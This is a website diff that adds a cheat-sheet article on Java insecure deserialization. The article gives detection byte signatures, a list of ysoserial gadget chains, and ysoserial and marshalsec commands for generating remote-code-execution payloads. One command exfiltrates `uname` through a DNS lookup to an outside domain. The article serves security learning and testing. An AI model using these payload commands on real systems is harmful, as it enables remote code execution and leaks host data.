@@ -3,13 +3,15 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="">
+<meta name="description" content="Java insecure object deserialization attacks, everything you need to know">
 <meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Tags" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://www.grayhatfreelancing.com/tags/" />
-<title>Tags | Gray Hat Freelancing</title>
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Insecure Deserialization - Java" />
+<meta property="og:description" content="Java insecure object deserialization attacks, everything you need to know" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/insecure_deserialization/java/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2023-03-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-03-23T00:00:00+00:00" />
+<title>Insecure Deserialization - Java | Gray Hat Freelancing</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
@@ -28,7 +30,6 @@ if (!doNotTrack) {
 	gtag('config', 'G-5VH24CV5RY', { 'anonymize_ip': false });
 }
 </script>
-<link rel="alternate" type="application/rss+xml" href="https://www.grayhatfreelancing.com/tags/index.xml" title="Gray Hat Freelancing" />
 <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
@@ -112,7 +113,7 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
   
 
   
-    <a href="/docs/insecure_deserialization/java/" class="">Insecure Deserialization - Java</a>
+    <a href="/docs/insecure_deserialization/java/" class="active">Insecure Deserialization - Java</a>
   
 
         </li>
@@ -1140,7 +1141,7 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
     <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Tags</strong>
+  <strong>Insecure Deserialization - Java</strong>
 
   <label for="toc-control">
     
@@ -1153,64 +1154,25 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
   
   <aside class="hidden clearfix">
     
-  <nav>
+  
+<nav id="TableOfContents">
   <ul>
-  
-    
-    <li class="book-section-flat">
-      <strong>Categories</strong>
+    <li><a href="#java-deserialization">Java Deserialization</a>
       <ul>
-      
-        <li class="flex justify-between">
-          <a href="/categories/cmd&#43;ctrl/">Cmd&#43;Ctrl</a>
-          <span>1</span>
+        <li><a href="#detection">Detection</a></li>
+        <li><a href="#tools">Tools</a>
+          <ul>
+            <li><a href="#ysoserial">Ysoserial</a></li>
+            <li><a href="#burp-extensions-using-ysoserial">Burp extensions using ysoserial</a></li>
+            <li><a href="#alternative-tooling">Alternative Tooling</a></li>
+          </ul>
         </li>
-      
-        <li class="flex justify-between">
-          <a href="/categories/walkthroughs/">Walkthroughs</a>
-          <span>2</span>
-        </li>
-      
-        <li class="flex justify-between">
-          <a href="/categories/tryhackme/">TryHackMe</a>
-          <span>1</span>
-        </li>
-      
+        <li><a href="#gadgets">Gadgets</a></li>
       </ul>
     </li>
-    
-  
-    
-    <li class="book-section-flat">
-      <strong>Tags</strong>
-      <ul>
-      
-        <li class="flex justify-between">
-          <a href="/tags/ctf/">ctf</a>
-          <span>2</span>
-        </li>
-      
-        <li class="flex justify-between">
-          <a href="/tags/attack-surface-mapping/">attack surface mapping</a>
-          <span>1</span>
-        </li>
-      
-        <li class="flex justify-between">
-          <a href="/tags/password-cracking/">password cracking</a>
-          <span>1</span>
-        </li>
-      
-        <li class="flex justify-between">
-          <a href="/tags/sql-injection/">sql injection</a>
-          <span>1</span>
-        </li>
-      
-      </ul>
-    </li>
-    
-  
   </ul>
 </nav>
+
 
 
   </aside>
@@ -1220,89 +1182,153 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
 
       
       
-  
-  <article class="markdown book-post">
-    <h2>
-      <a href="/tags/ctf/">ctf</a>
-    </h2>
-    
-  <h5>March 9, 2023</h5>
-
-
-
-  
-
-  
-
-
-
-
-    <p>
-    </p>
-  </article>
-  
-  <article class="markdown book-post">
-    <h2>
-      <a href="/tags/attack-surface-mapping/">attack surface mapping</a>
-    </h2>
-    
-  <h5>November 25, 2022</h5>
-
-
-
-  
-
-  
-
-
-
-
-    <p>
-    </p>
-  </article>
-  
-  <article class="markdown book-post">
-    <h2>
-      <a href="/tags/password-cracking/">password cracking</a>
-    </h2>
-    
-  <h5>November 25, 2022</h5>
-
-
-
-  
-
-  
-
-
-
-
-    <p>
-    </p>
-  </article>
-  
-  <article class="markdown book-post">
-    <h2>
-      <a href="/tags/sql-injection/">sql injection</a>
-    </h2>
-    
-  <h5>November 25, 2022</h5>
-
-
-
-  
-
-  
-
-
-
-
-    <p>
-    </p>
-  </article>
-  
-
-  
+  <article class="markdown"><h1 id="java-deserialization">
+  Java Deserialization
+  <a class="anchor" href="#java-deserialization">#</a>
+</h1>
+<h2 id="detection">
+  Detection
+  <a class="anchor" href="#detection">#</a>
+</h2>
+<p><code>&quot;AC ED 00 05&quot;</code> in Hex
+<code>AC ED</code>: <strong>STREAM_MAGIC</strong>. Specifies that this is a serialization protocol.
+<code>00 05</code>: <strong>STREAM_VERSION</strong>. The serialization version.
+<code>&quot;rO0&quot;</code> in Base64
+<code>Content-type = &quot;application/x-java-serialized-object&quot;</code>
+<code>&quot;H4sIAAAAAAAAAJ&quot;</code> in gzip(base64)</p>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<h3 id="ysoserial">
+  Ysoserial
+  <a class="anchor" href="#ysoserial">#</a>
+</h3>
+<p><a href="https://github.com/frohoff/ysoserial">frohoff/ysoserial</a> : A proof-of-concept tool for generating payloads that
+exploit unsafe Java object deserialization.</p>
+<pre tabindex="0"><code>java -jar ysoserial.jar CommonsCollections1 calc.exe &gt; commonpayload.bin
+java -jar ysoserial.jar Groovy1 calc.exe &gt; groovypayload.bin
+java -jar ysoserial.jar Groovy1 &#39;ping 127.0.0.1&#39; &gt; payload.bin
+java -jar ysoserial.jar Jdk7u21 bash -c &#39;nslookup `uname`.[redacted]&#39; | gzip | base64
+</code></pre><p>List of payloads included in ysoserial:</p>
+<pre tabindex="0"><code>	Payload             Authors                                Dependencies
+	-------             -------                                ------------
+	AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
+	BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
+	C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
+	Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
+	Clojure             @JackOfMostTrades                      clojure:1.8.0
+	CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1,
+commons-logging:1.2
+	CommonsCollections1 @frohoff                               commons-collections:3.1
+	CommonsCollections2 @frohoff                               commons-collections4:4.0
+	CommonsCollections3 @frohoff                               commons-collections:3.1
+	CommonsCollections4 @frohoff                               commons-collections4:4.0
+	CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
+	CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
+	CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
+	FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
+	Groovy1             @frohoff                               groovy:2.3.9
+	Hibernate1          @mbechler
+	Hibernate2          @mbechler
+	JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final,
+ cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+	JRMPClient          @mbechler
+	JRMPListener        @mbechler
+	JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE,
+ aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2,
+ spring-core:4.1.4.RELEASE, commons-collections:3.1
+	JavassistWeld1      @matthias_kaiser                      javassist:3.12.1.GA,
+weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+	Jdk7u21             @frohoff
+	Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
+	MozillaRhino1       @matthias_kaiser                       js:1.7R2
+	MozillaRhino2       @_tint0                                js:1.7R2
+	Myfaces1            @mbechler
+	Myfaces2            @mbechler
+	ROME                @mbechler                              rome:1.0
+	Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
+	Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE,
+aopalliance:1.0, commons-logging:1.2
+	URLDNS              @gebl
+	Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
+	Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
+</code></pre><h3 id="burp-extensions-using-ysoserial">
+  Burp extensions using ysoserial
+  <a class="anchor" href="#burp-extensions-using-ysoserial">#</a>
+</h3>
+<ul>
+<li>JavaSerialKiller</li>
+<li>Java Deserialization Scanner</li>
+<li>Burp-ysoserial</li>
+<li>SuperSerial</li>
+<li>SuperSerial-Active</li>
+</ul>
+<h3 id="alternative-tooling">
+  Alternative Tooling
+  <a class="anchor" href="#alternative-tooling">#</a>
+</h3>
+<ul>
+<li>pwntester/JRE8u20_RCE_Gadget</li>
+<li>joaomatosf/JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool</li>
+<li>pimps/ysoserial-modified</li>
+<li>NickstaDB/SerialBrute - Java serialization brute force attack tool</li>
+<li>NickstaDB/SerializationDumper - A tool to dump Java serialization streams in a more human readable form</li>
+<li>bishopfox/gadgetprobe</li>
+<li>mbechler/marshalsec - Turning your data into code execution</li>
+</ul>
+<pre tabindex="0"><code>$ java -cp marshalsec.jar marshalsec.&lt;Marshaller&gt; [-a] [-v] [-t] [&lt;gadget_type&gt; [&lt;arguments...&gt;]]
+$ java -cp marshalsec.jar marshalsec.JsonIO Groovy &#34;cmd&#34; &#34;/c&#34; &#34;calc&#34;
+$ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://localhost:8000\#exploit.JNDIExploit 1389
+		-a - generates/tests all payloads for that marshaller
+		-t - runs in test mode, unmarshalling the generated payloads after generating them.
+		-v - verbose mode, e.g. also shows the generated payload in test mode.
+ - gadget_type - Identifier of a specific gadget, if left out will display the available ones for that specific
+marshaller.
+ - arguments - Gadget specific arguments
+</code></pre><p>Payload generators for the following marshallers are included:</p>
+<pre tabindex="0"><code>Marshaller	Gadget Impact
+BlazeDSAMF(0|3|X)	JDK only escalation to Java serialization various third party libraries RCEs
+Hessian|Burlap	various third party RCEs
+Castor	dependency library RCE
+Jackson	possible JDK only RCE, various third party RCEs
+Java	yet another third party RCE
+JsonIO	JDK only RCE
+JYAML	JDK only RCE
+Kryo	third party RCEs
+KryoAltStrategy	JDK only RCE
+Red5AMF(0|3)	JDK only RCE
+SnakeYAML	JDK only RCEs
+XStream	JDK only RCEs
+YAMLBeans	third party RCE
+</code></pre><h2 id="gadgets">
+  Gadgets
+  <a class="anchor" href="#gadgets">#</a>
+</h2>
+<p>Require: * java.io.Serializable</p>
+<p>##&lt;References</p>
+<ul>
+<li><a href="https://github.com/frohoff/ysoserial">Github - ysoserial</a></li>
+<li>[Triggering a DNS lookup using Java Deserializatio]n -
+paranoidsoftware.com](<a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a>)</li>
+<li><a href="https://www.gosecure.net/blog/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/">Detecting deserialization bugs with DNS exfiltration - Philippe Arteau | Mar 22,
+2017</a></li>
+<li><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet/blob/master/README.md">Java-Deserialization-Cheat-Sheet -
+GrrrDog</a></li>
+<li><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/">Understanding &amp; practicing java deserialization
+exploits</a></li>
+<li><a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a">How i found a 1500$ worth Deserialization vulnerability -
+@D0rkerDevil</a></li>
+<li>[Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities - 14 Aug 2017, Peter
+Stöckli](<a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-">https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-</a>
+vulnerabilities.html)</li>
+<li><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">Jackson CVE-2019-12384: anatomy of a vulnerability class</a></li>
+<li><a href="https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96">On Jackson CVEs: Don’t Panic — Here is what you need to
+know</a></li>
+<li><a href="https://portswigger.net/research/pre-auth-rce-in-forgerock-openam-cve-2021-35464">Pre-auth RCE in ForgeRock OpenAM (CVE-2021-35464) - Michael Stepankin / @artsploit - 29 June
+2021</a></li>
+</ul>
+</article>
  
       
 
@@ -1336,64 +1362,25 @@ window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJ
     <aside class="book-toc">
       <div class="book-toc-content">
         
-  <nav>
+  
+<nav id="TableOfContents">
   <ul>
-  
-    
-    <li class="book-section-flat">
-      <strong>Categories</strong>
+    <li><a href="#java-deserialization">Java Deserialization</a>
       <ul>
-      
-        <li class="flex justify-between">
-          <a href="/categories/cmd&#43;ctrl/">Cmd&#43;Ctrl</a>
-          <span>1</span>
+        <li><a href="#detection">Detection</a></li>
+        <li><a href="#tools">Tools</a>
+          <ul>
+            <li><a href="#ysoserial">Ysoserial</a></li>
+            <li><a href="#burp-extensions-using-ysoserial">Burp extensions using ysoserial</a></li>
+            <li><a href="#alternative-tooling">Alternative Tooling</a></li>
+          </ul>
         </li>
-      
-        <li class="flex justify-between">
-          <a href="/categories/walkthroughs/">Walkthroughs</a>
-          <span>2</span>
-        </li>
-      
-        <li class="flex justify-between">
-          <a href="/categories/tryhackme/">TryHackMe</a>
-          <span>1</span>
-        </li>
-      
+        <li><a href="#gadgets">Gadgets</a></li>
       </ul>
     </li>
-    
-  
-    
-    <li class="book-section-flat">
-      <strong>Tags</strong>
-      <ul>
-      
-        <li class="flex justify-between">
-          <a href="/tags/ctf/">ctf</a>
-          <span>2</span>
-        </li>
-      
-        <li class="flex justify-between">
-          <a href="/tags/attack-surface-mapping/">attack surface mapping</a>
-          <span>1</span>
-        </li>
-      
-        <li class="flex justify-between">
-          <a href="/tags/password-cracking/">password cracking</a>
-          <span>1</span>
-        </li>
-      
-        <li class="flex justify-between">
-          <a href="/tags/sql-injection/">sql injection</a>
-          <span>1</span>
-        </li>
-      
-      </ul>
-    </li>
-    
-  
   </ul>
 </nav>
+
 
  
       </div>
